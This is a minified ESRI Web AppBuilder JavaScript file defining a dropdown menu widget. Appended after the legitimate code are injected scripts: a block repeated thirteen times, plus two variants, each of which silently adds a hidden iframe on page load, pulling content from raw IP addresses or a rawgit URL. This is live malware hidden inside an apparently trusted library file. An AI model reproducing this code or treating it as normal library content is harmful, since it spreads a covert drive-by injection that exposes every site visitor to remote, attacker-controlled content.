// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/query dojo/Evented".split(" "),function(g,h,k,d,l,b,e,f,m){return g([h,k,m],{baseClass:"jimu-dijit-dropdownmenu",declaredClass:"jimu.dijit.DropdownMenu",templateString:"\x3cdiv\x3e\x3c/div\x3e",itemHeight:24,iconSize:16,offsetY:5,shelter:null,paddingOffsetY:8,dropdownMenuItemClass:"dropdown-menu-item",items:null,highlightValue:"",highlightSelectedItemAfterClick:!0,menuLeadingIcon:!0,
maxDisplayItems:10,postCreate:function(){this.inherited(arguments);this.items||(this.items=[]);this.shelter=b.toDom('\x3cdiv class\x3d"jimu-dijit-dropdownmenu-shelter"\x3e\x3c/div\x3e');this.itemsContainer=b.toDom('\x3cdiv class\x3d"jimu-dijit-dropdownmenu-items-container"\x3e\x3c/div\x3e');0>=this.maxDisplayItems&&(this.maxDisplayItems=20);this.itemsContainer.style.maxHeight=this.itemHeight*this.maxDisplayItems+2*this.paddingOffsetY+"px";l.forEach(this.items,d.hitch(this,function(a){var c=b.toDom('\x3cdiv class\x3d"'+
this.dropdownMenuItemClass+' jimu-ellipsis"\x3e'+a.label+"\x3c/div\x3e");c.itemInfo=a;c.title=a.label;b.place(c,this.itemsContainer)}));this.own(e(this.domNode,"click",d.hitch(this,this._onIconClick)));this.own(e(this.shelter,"click",d.hitch(this,this._onShelterClick)));this.own(e(this.itemsContainer,"click",d.hitch(this,this._onItemsContainerClick)));this.highlightValue&&this.setHighlightValue(this.highlightValue)},_onIconClick:function(a){a.stopPropagation();this.isShowing()?this.hideMenu():(a=
b.position(a.target||a.srcElement),this.showMenu(a))},_onShelterClick:function(){this.hideMenu()},_onItemsContainerClick:function(a){a.stopPropagation();a=a.target||a.srcElement;b.hasClass(a,this.dropdownMenuItemClass)&&(a=a.itemInfo.value,this.highlightSelectedItemAfterClick&&this.setHighlightValue(a),this.emit("click-item",a));this.hideMenu()},clearHighlightValue:function(){f("."+this.dropdownMenuItemClass,this.itemsContainer).removeClass("selected")},setHighlightValue:function(a){this.clearHighlightValue();
f("."+this.dropdownMenuItemClass,this.itemsContainer).some(d.hitch(this,function(c){return c.itemInfo.value===a?(b.addClass(c,"selected"),!0):!1}))},getHighlightValue:function(){var a=f("."+this.dropdownMenuItemClass+".selected",this.itemsContainer)[0];return a?a.itemInfo.value:null},isShowing:function(){return b.hasClass(this.domNode,"showing")},showMenu:function(a){this.itemsContainer.style.top=a.y+this.iconSize+this.offsetY+"px";this.menuLeadingIcon===window.isRTL?(this.itemsContainer.style.left=
a.x+"px",this.itemsContainer.style.right="auto"):(this.itemsContainer.style.right=window.innerWidth-(a.x+this.iconSize)+"px",this.itemsContainer.style.left="auto");b.place(this.shelter,document.body);b.place(this.itemsContainer,document.body);b.addClass(this.domNode,"showing")},hideMenu:function(){this.itemsContainer.parentNode&&this.itemsContainer.parentNode.removeChild(this.itemsContainer);this.shelter.parentNode&&this.shelter.parentNode.removeChild(this.shelter);b.removeClass(this.domNode,"showing")},
destroy:function(){this.hideMenu();b.destroy(this.itemsContainer);b.destroy(this.shelter);this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});